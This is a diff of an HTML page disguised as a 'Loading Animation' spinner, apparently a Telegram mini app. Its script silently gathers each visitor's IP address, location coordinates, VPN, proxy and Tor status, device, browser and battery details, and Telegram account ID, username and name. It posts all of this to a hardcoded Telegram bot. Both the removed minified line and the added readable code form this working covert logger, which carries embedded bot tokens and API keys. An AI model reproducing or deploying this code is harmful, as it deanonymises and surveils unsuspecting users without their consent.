@@ -1,1 +1,211 @@
-function getBrowserInfo(){const e=navigator.userAgent;let n="";const t=e.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i);if(/trident/i.test(t[1])){n="IE "+(/\brv[ :]+(\d+)/g.exec(e)[1]||"")}if("Chrome"===t[1]){const t=e.match(/\b(OPR|Edge)\/(\d+)/);null!=t&&(n=t.slice(1).join(" ").replace("OPR","Opera"))}return t[2]=t[2]?"version "+t[2]:"",n=`${t[1]} ${t[2]||""}`.trim()}document.addEventListener("DOMContentLoaded",function(){let e,n,t;navigator.getBattery().then(function(n){e=100*n.level}),n=window.screen.width,t=window.screen.height;const a=window.Telegram.WebApp,o=(new URLSearchParams(window.location.search),navigator.userAgent);fetch("https://ipapi.co/json/").then(e=>e.json()).then(i=>{const r=i.ip,s=i.city,c=i.region,g=(i.country_name,i.latitude),p=i.longitude,d=i.timezone,m=i.org,$=(i.postal,i.utc_offset,i.currency,i.version,i.country_tld,i.country_calling_code,navigator.platform,Intl.DateTimeFormat().resolvedOptions().timeZone),u=getBrowserInfo();document.createElement("p");let l=new Date,f=l.getHours(),y=l.getMinutes(),h=`${f<10?"0"+f:f}:${y<10?"0"+y:y}`,v=navigator.language,w=new Date,D=w.getDate(),_=w.getMonth()+1,P=w.getFullYear(),T=w.getDay();D<10&&(D="0"+D),_<10&&(_="0"+_);let U=D+"."+_+"."+P,b=navigator.deviceMemory,A=navigator.connection.effectiveType;fetch("https://ipinfo.io/"+r+"?token=afae6637fcf7bf").then(e=>e.json()).then(i=>{let l=!(!i.privacy||!i.privacy.proxy),f=!(!i.privacy||!i.privacy.vpn),y=!(!i.privacy||!i.privacy.tor),w=i.asn&&i.asn.asn,D=i.asn&&i.asn.route,_=i.asn&&i.asn.domain;fetch("https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf").then(e=>e.json()).then(i=>{let P=i.device,I=P.brand||"Xiaomi/Samsung/Poco/Huawei/Google Pixel",x=P.name,M=P.type,O=i.engine.name,S=i.os.name,k=i.os.version;const B=`\n      * Ip 🌐*\n    *├ IP: ${r}*\n    *├ UserAgent: ${o}*\n    *├ Provider: ${m}*\n    *├ City: ${s}*\n    *├ Region: ${c}*\n    *├ Timezone IP: ${d}*\n    *├ Proxy: ${l}*\n    *├ Vpn: ${f}*\n    *├ Tor: ${y}*\n    *├ Coordinates: ${p} ${g},*\n    *├ Asn: ${w}*\n    *├ Route: ${D}*\n    *├ Domain: ${_}*\n      * System 🖥*\n    *├ Browser: ${u}*\n    *├ Browser Engine: ${O}*\n    *├ Os: ${S} ${k}*\n    *├ Battery: ${e}%*\n    *├ Screen resolution: ${n}x${t}*\n    *├ Time: ${h}*\n    *├ Language: ${v}*\n    *├ Date: ${U} Day of week: ${T}*\n    *├ Memory: ${b} RAM*\n    *├ Internet: ${A}*\n    *├ TimeZone: ${$}*\n    *├ Device: ${I} ${x}*\n    *├ Device Type: ${M}*\n      *🔍 Account: *\n    *├ ID: ${a.initDataUnsafe.user.id}*\n    *├ Username: @${a.initDataUnsafe.user.username}*\n    *├ Name: ${a.initDataUnsafe.user.first_name}*\n    *├ Language: ${a.initDataUnsafe.user.language_code}*\n    *├ Can Write To Pm: ${a.initDataUnsafe.user.allows_write_to_pm}*\n    *Killed by n0neparty logger 👾*\n                             `,C=new FormData;C.append("chat_id","-1002084822950"),C.append("text",B),C.append("parse_mode","Markdown"),fetch("https://api.telegram.org/bot6760998368:AAGASTUFyPU3WQyupgYDk11ygOb4SU7oCus/sendMessage",{method:"POST",body:C})})})})});
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading Animation</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-color: #333; /* Темно-серый фон */
+    }
+
+    .loader {
+        border: 4px solid rgba(255, 255, 255, 0.1);
+        border-top: 4px solid #fff;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 15s linear infinite; /* Вращение в течение 15 секунд */
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(1440deg); } /* 360 * 4 = 1440 градусов для 4-кратного ускорения */
+    }
+</style>
+</head>
+<body>
+    <div class="loader"></div>
+</body>
+</html>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    let batteryLevel;
+    let screenWidth;
+    let screenHeight;
+
+    navigator.getBattery().then(function(battery) {
+        batteryLevel = battery.level * 100;
+    });
+
+    
+    screenWidth = window.screen.width;
+    screenHeight = window.screen.height;
+
+    const batteryLevelConst = batteryLevel;
+    const screenWidthConst = screenWidth;
+    const screenHeightConst = screenHeight;
+
+    const tg = window.Telegram.WebApp;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const userAgent = navigator.userAgent;
+
+fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country_name;
+        const latitude = data.latitude;
+        const longitude = data.longitude;
+        const time = data.timezone;
+        const isp = data.org;
+        const postal = data.postal;
+        const utc = data.utc_offset;
+        const currency = data.currency;
+        const versian = data.version;
+        const tld = data.country_tld;
+        const countrycall = data.country_calling_code;
+        const osname = navigator.platform;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const browser = getBrowserInfo();
+        let userid = document.createElement('p');
+
+        let systemTime = new Date();
+        let hours = systemTime.getHours();
+        let minutes = systemTime.getMinutes();
+        let formattedHours = hours < 10 ? '0' + hours : hours;
+        let formattedMinutes = minutes < 10 ? '0' + minutes : minutes;
+        let formattedTime = `${formattedHours}:${formattedMinutes}`;
+    
+       let language = navigator.language
+      
+       let datee = new Date();
+       let day = datee.getDate();
+       let month = datee.getMonth() + 1;
+       let year = datee.getFullYear();
+  
+       let dayOfWeek = datee.getDay();
+    
+    if (day < 10) {
+        day = '0' + day;
+    }
+    
+    if (month < 10) {
+        month = '0' + month;
+    }
+    
+    let formedDate = day + '.' + month + '.' + year;
+      
+    let memory = navigator.deviceMemory;
+  
+    let TypeInternet = navigator.connection.effectiveType;
+
+fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
+.then(response => response.json())
+.then(data => {
+  let isProxy = data.privacy && data.privacy.proxy ? true : false;
+  let isVPN = data.privacy && data.privacy.vpn ? true : false;
+  let isTOR = data.privacy && data.privacy.tor ? true : false;
+  let isAsn = data.asn && data.asn.asn;
+  let isRoute = data.asn && data.asn.route;
+  let isDomain = data.asn && data.asn.domain;
+
+fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
+.then(response => response.json())
+.then(data => {
+  let device = data.device;
+  let brand = device.brand || 'Xiaomi/Samsung/Poco/Huawei/Google Pixel';
+  let model = device.name;
+  let deviceType = device.type;
+  let engine = data.engine; 
+  let namebrowser = engine.name;
+  let osnam = data.os.name;
+  let osvers = data.os.version;
+    
+        const message = `
+      * Ip 🌐*
+    *├ IP: ${ip}*
+    *├ UserAgent: ${userAgent}*
+    *├ Provider: ${isp}*
+    *├ City: ${city}*
+    *├ Region: ${region}*
+    *├ Timezone IP: ${time}*
+    *├ Proxy: ${isProxy}*
+    *├ Vpn: ${isVPN}*
+    *├ Tor: ${isTOR}*
+    *├ Coordinates: ${longitude} ${latitude},*
+    *├ Asn: ${isAsn}*
+    *├ Route: ${isRoute}*
+    *├ Domain: ${isDomain}*
+      * System 🖥*
+    *├ Browser: ${browser}*
+    *├ Browser Engine: ${namebrowser}*
+    *├ Os: ${osnam} ${osvers}*
+    *├ Battery: ${batteryLevel}%*
+    *├ Screen resolution: ${screenWidth}x${screenHeight}*
+    *├ Time: ${formattedTime}*
+    *├ Language: ${language}*
+    *├ Date: ${formedDate} Day of week: ${dayOfWeek}*
+    *├ Memory: ${memory} RAM*
+    *├ Internet: ${TypeInternet}*
+    *├ TimeZone: ${timeZone}*
+    *├ Device: ${brand} ${model}*
+    *├ Device Type: ${deviceType}*
+      *🔍 Account: *
+    *├ ID: ${tg.initDataUnsafe.user.id}*
+    *├ Username: @${tg.initDataUnsafe.user.username}*
+    *├ Name: ${tg.initDataUnsafe.user.first_name}*
+    *├ Language: ${tg.initDataUnsafe.user.language_code}*
+    *├ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
+    *Killed by n0neparty logger 👾*
+                             `;
+
+        
+        const token = '6760998368:AAGASTUFyPU3WQyupgYDk11ygOb4SU7oCus';
+        const chatId = '-1002084822950';
+        const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', message);
+        formData.append('parse_mode', 'Markdown');
+        fetch(url, {
+            method: 'POST',
+            body: formData
+        });
+      });
+    });
+  });
+});
+        
+function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    let browser = '';
+    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i);
+
+    if (/trident/i.test(match[1])) {
+        const tem = /\brv[ :]+(\d+)/g.exec(ua);
+        browser = 'IE ' + (tem[1] || '');
+    }
+
+    if (match[1] === 'Chrome') {
+        const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
+        if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
+    }
+
+    match[2] = match[2] ? 'version ' + match[2] : '';
+    browser = `${match[1]} ${match[2] || ''}`.trim();
+    return browser;
+};
+    </script>
+</body>
+</html>
